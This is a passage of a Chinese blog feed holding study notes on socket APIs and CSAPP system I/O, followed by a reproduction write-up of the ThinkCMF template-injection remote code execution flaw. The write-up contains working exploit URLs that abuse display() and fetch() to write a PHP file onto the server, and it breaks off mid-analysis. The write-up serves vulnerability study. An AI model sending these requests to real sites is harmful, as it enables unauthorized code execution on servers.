<span class="keyword">if</span> ((nread = read(fd, ptr, nleft)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (errno == EINTR)</span><br><span class="line">                nread = <span class="number">0</span>;      <span class="comment">/* 这里需要再次调用 read */</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;              <span class="comment">/* EOF(End of File) 表示套接字关闭 */</span></span><br><span class="line"> </span><br><span class="line">        nleft -= nread;</span><br><span class="line">        ptr   += nread;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> n - nleft;      <span class="comment">/* 返回的是实际读取的字节数 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>write</p><blockquote><p>从套接口中发送 len 字节的数据，成功返回，返回实际写入数据的字节数</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> write(<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> count);</span><br></pre></td></tr></table></figure><p>recv</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">recv</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">int</span> len, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></table></figure><p>recvfrom</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> recvfrom(<span class="keyword">int</span> sockfd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags,</span><br><span class="line">                        struct sockaddr *src_addr, <span class="keyword">socklen_t</span> *addrlen);</span><br></pre></td></tr></table></figure><p>send</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">send</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">void</span> *msg, <span class="keyword">int</span> len, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></table></figure><p>sendto</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> sendto(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags,</span><br><span class="line">                      <span class="keyword">const</span> struct sockaddr *dest_addr, <span class="keyword">socklen_t</span> addrlen);</span><br><span class="line"><span class="comment">// socklen_t 不需要指针</span></span><br></pre></td></tr></table></figure><p>recvmsg</p><p>sendmsg</p><h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><p>connect</p><blockquote><p>TCP 客户端与服务器建立连接用 connect 函数</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">connect</span><span class="params">(<span class="keyword">int</span> sockfd, struct sockaddr * addressp, <span class="keyword">int</span> addrlen)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h3><p>shutdown</p><blockquote><p>终止网络连接并停止所有信息的发送与接收（不管引用计数器为何值）</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shutdown</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">int</span> how)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sockfd：套接口描述字</span></span><br><span class="line"><span class="comment">// how：套接口关闭方式，SHUT_RD、SHUT_WR、SHUT_RDWR</span></span><br></pre></td></tr></table></figure><p>close</p><blockquote><p>计数器减一，不会完全关闭</p></blockquote><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">getsockopt/setsockopt</span><br></pre></td></tr></table></figure><h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gethostbyaddr getaddrbyhost,...</span><br></pre></td></tr></table></figure><h3 id="非阻塞-1"><a href="#非阻塞-1" class="headerlink" title="非阻塞"></a>非阻塞</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> flag = fcntl(sockfd, F_GETFL, <span class="number">0</span>);</span><br><span class="line">fcntl(sockfd, F_SETFL, flag|O_NONBLOCK);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> nIO = <span class="number">1</span>;</span><br><span class="line">ioctl(sockfd, FIONBIO, &amp;nIO);</span><br></pre></td></tr></table></figure><h3 id="复用"><a href="#复用" class="headerlink" title="复用"></a>复用</h3><p>fd_set</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FD_ZERO</span><span class="params">(fd_set * fdset)</span></span>; <span class="comment">// 清除描述字集 fdset 中的所有位</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FD_SET</span><span class="params">(<span class="keyword">int</span> fd, fd_set *fdset)</span></span>; <span class="comment">// 在 fdset 集中加入fd描述字（为什么要事先添加？</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FD_CLR</span><span class="params">(<span class="keyword">int</span> fd, fd_set *fdset)</span></span>; <span class="comment">// 将 fd 从 fdset 中清除</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FD_ISSET</span><span class="params">(<span class="keyword">int</span> fd, fd_set *fdset)</span></span>; <span class="comment">// 判断 fd 是否在 fdset 中（而不是看是否为1？</span></span><br></pre></td></tr></table></figure><p>select</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/select.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">select</span><span class="params">(<span class="keyword">int</span> fdmax, fd_set *readfds, fd_set *writefds, fd_set *exceptfds,struct timeval *timeout)</span></span>;</span><br><span class="line"><span class="comment">// select 后，要注意复原 fd_set</span></span><br></pre></td></tr></table></figure><p>poll</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">poll</span><span class="params">(struct pollfd *fds, <span class="keyword">nfds_t</span> nfds, <span class="keyword">int</span> timeout)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// POLLIN / POLLOUT / POLLERR </span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> fd; <span class="comment">/* 文件描述符 */</span></span><br><span class="line">    <span class="keyword">short</span> events; <span class="comment">/* 需要等待的事件 */</span></span><br><span class="line">    <span class="keyword">short</span> revents; <span class="comment">/* 实际发生了的事件，返回值 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>epoll</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建 epoll</span></span><br><span class="line"><span class="keyword">int</span> epfd = epoll_crete(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//将 listen_fd 添加进 epoll 中</span></span><br><span class="line">epoll_ctl(epfd, EPOLL_CTL_ADD, listen_fd,&amp;listen_event);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">//阻塞等待 epoll 中 的fd 触发</span></span><br><span class="line">    <span class="keyword">int</span> active_cnt = epoll_wait(epfd, events, <span class="number">1000</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span> ; i &lt; active_cnt; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (evnets[i].data.fd == listen_fd) &#123;</span><br><span class="line">            <span class="comment">//accept. 并且将新accept 的fd 加进epoll中.</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (events[i].events &amp; EPOLLIN) &#123;</span><br><span class="line">            <span class="comment">//对此fd 进行读操作</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (events[i].events &amp; EPOLLOUT) &#123;</span><br><span class="line">            <span class="comment">//对此fd 进行写操作</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="信号"><a href="#信号" class="headerlink" title="信号"></a>信号</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sig_alrm</span><span class="params">(<span class="keyword">int</span> signo)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span>;  <span class="comment">// 这里的处理对原阻塞是怎么处理的？</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">signal(SIGALRM, sig_alrm);  <span class="comment">// 绑定信号处理函数</span></span><br><span class="line">alarm(<span class="number">3</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;实践项目&quot;&gt;&lt;a href=&quot;#实践项目&quot; class=&quot;headerlink&quot; title=&quot;实践项目&quot;&gt;&lt;/a&gt;实践项目&lt;/h2&gt;&lt;p&gt;实现一个 telnet 版本的聊天服务器，主要有以下需求。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;每个客户端可以用使用 &lt;code&gt;te
      
    
    </summary>
    
    
      <category term="读书笔记" scheme="https://wywwzjj.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP 系统级 IO 笔记</title>
    <link href="https://wywwzjj.top/2019/11/25/CSAPP-Chapter-10-Notes/"/>
    <id>https://wywwzjj.top/2019/11/25/CSAPP-Chapter-10-Notes/</id>
    <published>2019-11-25T13:45:57.000Z</published>
    <updated>2020-03-22T10:11:48.051Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Unix-I-O"><a href="#Unix-I-O" class="headerlink" title="Unix I/O"></a>Unix I/O</h2><p>所有的 I/O 设备（例如网络、磁盘和终端）都被模型化为文件，而所有的输入和输出都被当作相应文件的读和写来执行。这种将设备优雅地映射为文件的方式，允许 Linux 内核引出一个简单、低级的应用接口，称为 Unix I/O，这使得所有的输入和输出都能以一种统一且一致的方式来执行。</p><h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><p>硬盘 =&gt; chs =&gt; 盘块 =&gt; 文件</p><p>文件：建立字符流（序列）到盘块集合的映射关系，由操作系统维护这个映射关系。</p><p>FCB 以块号为单位，会不会太大，比如单个位的编辑？</p><p>inode也会消耗硬盘空间，所以硬盘格式化的时候，操作系统自动将硬盘分成两个区域。一个是数据区，存放文件数据；另一个是inode区（inode table），存放inode所包含的信息。</p><p>Unix/Linux系统中，目录（directory）也是一种文件。打开目录，实际上就是打开目录文件。</p><p>目录文件的结构非常简单，就是一系列目录项（dirent）的列表。每个目录项，由两部分组成：所包含文件的文件名，以及该文件名对应的inode号码。</p><p>文件系统：一种用于持久性存储的系统抽象。</p><p>文件：文件系统中一个单元的相关数据在操作系统中的抽象。</p><p>文件系统提供了按名存取功能，使用户能透明地访问文件。</p><p>文件分类：</p><ul><li>目录文件：用于保存文件目录的文件</li><li>普通文件</li><li>设备文件</li></ul><p>这里引出了交换区和文件区。</p><p>文件区主要用于存放文件，追求存储空间的利用率，因此对文件区空间的管理采用离散分配方式；</p><p>交换区只占磁盘空间的小部分，被换出的进程数据就存放在这里，追求换入换出的速度，因此对交换区采用连续分配方式。</p><h3 id="虚拟文件系统"><a href="#虚拟文件系统" class="headerlink" title="虚拟文件系统"></a>虚拟文件系统</h3><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbgrf3xiekj20oe0adq7l.jpg" alt="image.png"></p><p>目的：对所有不同文件系统的抽象</p><p>文件系统主要功能：</p><ul><li>文件的按名存取</li><li>文件目录的建立和维护</li><li>文件的组织</li><li>文件存储空间的管理</li><li>提供各种操作文件的方法</li></ul><h2 id="逻辑结构"><a href="#逻辑结构" class="headerlink" title="逻辑结构"></a>逻辑结构</h2><h3 id="流式文件"><a href="#流式文件" class="headerlink" title="流式文件"></a>流式文件</h3><p>有序的字符流，内部无结构划分</p><h3 id="记录式文件"><a href="#记录式文件" class="headerlink" title="记录式文件"></a>记录式文件</h3><p>文件内的数据被划分为具有逻辑完整性的单元，每个单元称作一条记录，每条记录可以包含若干个数据项。（CSV</p><h2 id="物理结构"><a href="#物理结构" class="headerlink" title="物理结构"></a>物理结构</h2><h3 id="连续"><a href="#连续" class="headerlink" title="连续"></a>连续</h3><ul><li>为文件分配的必须是连续的盘块</li><li>顺序存取速度快，可以随机访问</li><li>会产生碎片，不利于文件扩展</li></ul><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><ul><li>用链表的形式把盘块串起来</li><li>可以解决碎片问题，外存利用率高，扩展性高</li><li>只能顺序访问，不能随机访问</li></ul><h3 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h3><ul><li>为文件数据块建立索引表，非连续存储分配，提高了空间的利用率</li><li>支持随机访问，易扩展</li><li>索引表本身占空间，访问数据块前需要读取索引块，增加了检索的开销</li></ul><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>文件系统通过文件的物理结构和目录文件实现按名存取功能。</p><h3 id="FCB"><a href="#FCB" class="headerlink" title="FCB"></a>FCB</h3><p>描述信息</p><ul><li>文件名</li><li>文件的逻辑结构信息</li><li>文件的物理结构信息</li></ul><p>管理信息</p><ul><li>存取控制信息，包括读、写、执行</li><li>使用信息，包括创建、修改、访问文件的时间</li></ul><h3 id="inode"><a href="#inode" class="headerlink" title="inode"></a>inode</h3><p>包含文件的元信息（无文件的名称）：</p><ul><li>文件字节数</li><li>文件拥有者的 User ID</li><li>文件的 Group id</li><li>文件的读、写、执行权限</li><li>文件的时间戳：ctime 指 inode 上一次变动的时间，mtime 指文件内容上一次变动的时间，atime指文件上次被打开的时间</li><li>链接数，即有多少文件名只想这个 inode</li><li>文件数据 block 的位置</li></ul><p>每个inode都有一个号码，操作系统用inode号码来识别不同的文件，系统内部不使用文件名。</p><p>对于系统来说，文件名只是inode号码便于识别的别称或者绰号。</p><p>表面上，用户通过文件名，打开文件。实际上，系统内部这个过程分成三步：首先，系统找到这个文件名对应的inode号码；其次，通过inode号码，获取inode信息；最后，根据inode信息，找到文件数据所在的block，读出数据。</p><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><h2 id="文件存储空间管理"><a href="#文件存储空间管理" class="headerlink" title="文件存储空间管理"></a>文件存储空间管理</h2><p>主要就是空闲区管理</p><h3 id="成组链接法"><a href="#成组链接法" class="headerlink" title="成组链接法"></a>成组链接法</h3><p>结构</p><p>分配、回收算法</p><h3 id="空闲表法"><a href="#空闲表法" class="headerlink" title="空闲表法"></a>空闲表法</h3><h3 id="空闲链表法"><a href="#空闲链表法" class="headerlink" title="空闲链表法"></a>空闲链表法</h3><p>空闲盘块链</p><p>空闲盘区链</p><h3 id="位示图法"><a href="#位示图法" class="headerlink" title="位示图法"></a>位示图法</h3><h2 id="共享"><a href="#共享" class="headerlink" title="共享"></a>共享</h2><p>类型</p><ul><li><p>基于索引结点（硬链接）</p><p>  计数器为0才真正删除文件</p></li><li><p>基于符号链（软链接）</p></li></ul><p>共享方法</p><ul><li>绕道法</li><li>链接法</li><li>基本文件目录法</li></ul><p>保护采用保护键法。</p><h2 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h2><p>文件保护</p><ul><li><p>口令保护</p></li><li><p>加密保护</p></li><li><p>访问控制</p><p>  用一个访问控制表（ACL）记录各个用户（或各组用户）对文件的访问权限</p></li></ul><p>保密安全策略分为 MAC（强制访问策略，安全性更高）、DAC（自主访问策略，更加灵活）</p><h2 id="设备管理"><a href="#设备管理" class="headerlink" title="设备管理"></a>设备管理</h2><p>主机对设备的访问表现为使用基本的端口通讯指令（in、out）与这组 IO 地址通讯。</p><p>设备相关层</p><ul><li>设备驱动程序</li><li>中断处理程序</li></ul><p>设备无关层</p><p>设备独立性：操作系统提供了物理设备到逻辑设备的抽象，用户或程序中使用的设备与具体的设备无关，不再需要关注设备的细节，方便用户使用。</p><h2 id="I-O-控制"><a href="#I-O-控制" class="headerlink" title="I/O 控制"></a>I/O 控制</h2><p>CPU 无法直接控制I/O设备的机械部件，因此I/O设备还要有一个电子部件作为 CPU 和 I/O 设备机械部件之间的“中介”，用于实现 CPU 对设备的控制。这个电子部件就是 I/O 控制器，又称设备控制器，CPU 可控制 I/O 控制器，又由 I/O 控制器来控制设备的机械部件。</p><p>I/O 控制器功能点：</p><ul><li>接受和识别CPU发出的指令（要有控制寄存器）</li><li>向CPU报告设备的状态（要有状态寄存器）</li><li>数据交换（要有数据寄存器，暂存输入、输出的数据）</li><li>地址识别（由I/O逻辑实现）</li></ul><p>两种寄存器编制方式</p><ul><li>内存映射<ul><li>控制器中的寄存器与内存统一控制</li><li>可以采用对内存进行操作的指令对控制器进行操作</li></ul></li><li>寄存器独立编制<ul><li>需要专门的指令来操作控制器</li></ul></li></ul><p>目标：减少 CPU 等待时间、减轻 CPU 负担、提高系统并行性</p><h3 id="程序查询"><a href="#程序查询" class="headerlink" title="程序查询"></a>程序查询</h3><p>进程提出 IO 请求并获得设备后，IO 子程序将不断循环检测设备的状态，直到设备能够满足 IO 操作的要求时实施传输动作。</p><p>设备《=》CPU《=》内存</p><h3 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h3><p>与异常的关系？</p><p>1.进程提出 IO 请求并获得设备后，若设备未就绪，则阻塞进程。</p><p>2.当设备进入就绪状态时，发出中断信号，已在系统中注册的中断处理函数唤醒进程以启动一个传输动作，而后再阻塞进程直到设备再次就绪。</p><p>设备《=》CPU《=》内存</p><h3 id="DMA"><a href="#DMA" class="headerlink" title="DMA"></a>DMA</h3><p>1.进程提出 IO 请求并获得设备后，将数据（或接收缓冲区）安置在内存中的位置和大小写入 DMA 控制器的寄存器内，启动 DMA 过程并阻塞进程。</p><p>2.DMA 控制器控制指定内存区域同设备之间的数据交换。其间需要使用总线时，总线控制权将供DMA使用（硬件机制）。</p><p>3.当原进程请求的IO操作全部完成时，DMA 控制器发出中断，中断处理程序唤醒进程。</p><p>DMA 中两个主要寄存器：</p><ul><li>基址寄存器，指示当前读或写的内存地址</li><li>计数寄存器，表示传输数据的字节数</li></ul><p>数据的传送单位是“块”。</p><p>设备《=》内存</p><h3 id="通道"><a href="#通道" class="headerlink" title="通道"></a>通道</h3><p>在DMA方式的基础上，通道方式中使用通道处理器替代DMA控制器来实施传输动作。</p><p>通道处理器是一个简单的专用处理器，具有自身的指令系统，可按程序完成传输动作。这使得通道处理器较只能进行单纯传输动作的DMA控制器具有更强大的功能，例如传输纠错、数据格式转换、数据预处理 等。</p><p>对于系统中的每一个通道，内存中有两个固定的专用存储单元分别存储通道程序的首地址（CAW通道地址字）和状态信息（CSW通道状态字）。</p><p>数据的传送单位是“一组数据块”</p><p>通道方式的运作过程：</p><p>➢ 进程提出IO请求并获得设备后，根据所要求的IO操作，生成由通道指令组成的通道程序，并将程序首地址写入CAW中。然后启动通道并阻塞进程。</p><p>➢ 通道处理器从CAW中找到通道程序，并按通道程序的指令完成数据传输过程。每条指令执行之后都将通道状态写入CSW中，使得主机能够随时掌握通道运行情况。</p><p>➢ 若通道程序执行中出现错误，通道处理器将发出错误中断，交由中断处理程序处理错误；若通道程序顺利执行完毕也将发出完成中断，由中断处理程序唤醒原进程。</p><h2 id="I-O-缓冲"><a href="#I-O-缓冲" class="headerlink" title="I/O 缓冲"></a>I/O 缓冲</h2><p>缓冲技术一般应用于两种速度不一致的部件之间的协作。一般形式是以缓冲区来暂时存放需要交换的信息。</p><ul><li>保证正确性：避免部件间速度不一致造成的信息缺失</li><li>缓解 CPU 与设备的速度矛盾</li><li>减少对 CPU 的中断频率</li><li>解决数据粒度不匹配问题</li><li>提高 CPU 与 I/O 设备之间的并行性</li></ul><p>使用缓冲技术的输出（Write）的一般过程：</p><ol><li>用户提出Write请求后，缓冲管理模块检查进程是否已取得相应的输出缓冲区，若已取得，则使用此缓冲区，否则申请一个空缓冲区，将其更改为该进程对该设备的输出缓冲区（可能阻塞原进程）。</li><li>缓冲管理模块使用访存指令将数据写入缓冲区内。</li><li>其间若达到一定的缓冲条件，则缓冲管理模块启动上层驱动程序，将整个缓冲区内的数据写入设备（冲洗，可能阻塞原进程），之后再继续步骤2，直到数据写入完成。</li></ol><p>使用缓冲技术的输入（Read）的一般过程：</p><ol><li>用户提出Read请求后，缓冲管理模块检查进程是否已取得相应的输入缓冲区，若已取得，则使用此缓冲区，否则申请一个空缓冲区，将其更改为该进程对该设备的输入缓冲区（可能阻塞原进程）。</li><li>缓冲管理模块使用访存指令从缓冲区内读出数据。</li><li>其间若缓冲区为空，则缓冲管理模块启动上层驱动程序，从设备读出数据到缓冲区（可能阻塞原进程），直至达到一定的缓冲条件后再继续步骤2，直到数据读出完成。</li></ol><h2 id="磁盘"><a href="#磁盘" class="headerlink" title="磁盘"></a>磁盘</h2><p>一次磁盘读/写操作需要的时间 = 寻道时间（大头） + 旋转延迟时间 + 传输时间</p><p>减少延迟时间方法：</p><ul><li>交替编号</li><li>错位命名</li><li>磁盘地址结构的设计</li></ul><p>驱动调度：</p><ul><li>移臂调度</li><li>旋转调度</li></ul><p>调度算法：</p><ul><li><p>先来先服务（FCFS）</p></li><li><p>最短寻找时间优先（SSTF）</p><p>  优先调度附近磁道。磁头在一个小区域内来来回回移动，可能产生饥饿</p></li><li><p>扫描算法（SCAN）</p><p>  为了杜绝上面的饥饿现象，加了点限定，只有磁头移动到最外侧了才能调头</p></li><li><p>电梯算法</p><p>  再扫描算法上又加了点限定，不用完全到磁道尽头，一旦反方向有请求，可直接响应</p></li><li><p>循环扫描算法（C-SCAN）</p><p>  从内到外，依次响应距离磁头最近的操作，到最外层柱面后立即回到最内柱面，继续之前的操作</p></li></ul><p>存储空间管理数据结构：</p><ul><li>位示图</li><li>空闲块表</li><li>空闲块链表</li></ul><p>磁盘管理：</p><ul><li>磁盘初始化</li><li>引导块</li><li>坏块的管理</li></ul><h2 id="I-O-重定向"><a href="#I-O-重定向" class="headerlink" title="I/O 重定向"></a>I/O 重定向</h2><h2 id="标准-I-O"><a href="#标准-I-O" class="headerlink" title="标准 I/O"></a>标准 I/O</h2><p>创建进程时，会打开三个文件，其文件描述符为 0、1、2，分别表示标准输入、标准输出以及标准错误流。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Unix-I-O&quot;&gt;&lt;a href=&quot;#Unix-I-O&quot; class=&quot;headerlink&quot; title=&quot;Unix I/O&quot;&gt;&lt;/a&gt;Unix I/O&lt;/h2&gt;&lt;p&gt;所有的 I/O 设备（例如网络、磁盘和终端）都被模型化为文件，而所有的输入和输出都被当作相应
      
    
    </summary>
    
    
      <category term="读书笔记" scheme="https://wywwzjj.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>ThinkCMF 前台模板注入 RCE</title>
    <link href="https://wywwzjj.top/2019/11/21/ThinkCMF-%E5%89%8D%E5%8F%B0%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-RCE/"/>
    <id>https://wywwzjj.top/2019/11/21/ThinkCMF-前台模板注入-RCE/</id>
    <published>2019-11-21T12:16:29.000Z</published>
    <updated>2020-03-22T10:11:48.077Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>ThinkCMF 是一款基于 PHP+MYSQL 开发的中文内容管理框架，底层采用 ThinkPHP3.2.3 构建。</p><p>远程攻击者在无需任何权限情况下，通过构造特定的请求包即可在远程服务器上执行任意代码。</p><p><strong>影响版本</strong></p><ul><li><p>ThinkCMF X1.6.0</p></li><li><p>ThinkCMF X2.1.0</p></li><li><p>ThinkCMF X2.2.0</p></li><li><p>ThinkCMF X2.2.1</p></li><li><p>ThinkCMF X2.2.2</p></li><li><p>ThinkCMF X2.2.3</p></li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>ThinkCMF X2.2.3 下载地址：<a href="https://pan.baidu.com/s/1bRXwdg" target="_blank" rel="noopener">https://pan.baidu.com/s/1bRXwdg</a></p><p>按照引导安装即可，该框架调试模式默认开启。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbfjisjsubj20m60myjsp.jpg" alt="image.png"></p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><ul><li>利用 <code>display()</code>，实现任意文件包含。</li></ul><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbfqmrkqpfj20j701yjrd.jpg" alt="image.png"></p><ul><li>利用 <code>display()</code> 写 shell。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://cmf.com/index.php/index/display/?templateFile=README.md&amp;content=%3C?php%20file_put_contents(%27i.php%27,%27%3C?php%20phpinfo();%20?&gt;%27);</span><br></pre></td></tr></table></figure><p>在根目录写入成功。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbfqin4rm3j207k0103yi.jpg" alt="image.png"></p><ul><li>利用 <code>fetch()</code> 直接写 PHP 文件。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://cmf.com/index.php/index/fetch/?content=%3C?php%20file_put_contents(%27i.php%27,%27%3C?php%20phpinfo();%20?%3E%27);</span><br></pre></td></tr></table></figure><p>在根目录写入成功。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbfqin4rm3j207k0103yi.jpg" alt="image.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><strong>目录结构</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">|--admin                      管理后台URL重定向目录，你可以将文件夹名改为任何你喜欢的</span><br><span class="line">  |--themes                   后台模板文件目录</span><br><span class="line">|--application                应用目录</span><br><span class="line">  |--Admin                    后台管理应用</span><br><span class="line">  |--Api                      公共接口</span><br><span class="line">  |--Asset                    资源管理应用</span><br><span class="line">  |--Comment                  评论应用</span><br><span class="line">  |--Common                   应用公共模块</span><br><span class="line">  |--Portal                   门户应用</span><br><span class="line">    |--Controller             必须目录，存放应用的操作模块如：IndexController.class.php</span><br><span class="line">  |--Conf                   可选，应用配置文件存放目录，如应用无配置文件则不需要</span><br><span class="line">  |--Common                 可选，应用函数库，如无则不需要</span><br><span class="line">  |--Lang  多语言包（可选）</span><br><span class="line">  |--Menu   后台菜单（可选）</span><br><span class="line">  |--Model    模型（可选）</span><br><span class="line">  |--nav.php  前台导航文件（可选）</span><br><span class="line">|--data                       各类数据存放目录，包括缓存数据</span><br><span class="line">|--simplewind                 核心包，无特殊情况请勿改动</span><br><span class="line">|--public                     静态文件存放包，包含bootstrap资源</span><br><span class="line">|--themes                     前台模板文件目录</span><br></pre></td></tr></table></figure><p>先回顾一下如何正常访问一个控制器，比如 Portal 下 IndexController.class.php 中的 index 方法。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">HomebaseController</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">($name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hello, $name~&lt;br&gt;"</span> . <span class="string">"This is index of IndexController."</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按照 ThinkPHP 提供的<a href="https://www.kancloud.cn/manual/thinkphp/1715" target="_blank" rel="noopener">方法</a>，可以是 <code>index.php/portal/index/index/name/wywwzjj</code>。（portal 是默认模块）</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbfrnhq18ej20gu02fjrb.jpg" alt="image.png"></p><blockquote><p>一般来说，ThinkPHP 的控制器是一个类，而操作则是控制器类的一个<strong>公共方法</strong>。</p></blockquote><p>也就是说，我们可以使用这种方式来调用任意的 public 方法。</p><p>注意到 IndexController 类继承了 HomebaseController，这有一系列继承。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">HomebaseController</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">HomebaseController</span> <span class="keyword">extends</span> <span class="title">AppframeController</span> </span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">AppframeController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">            <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Controller</span> 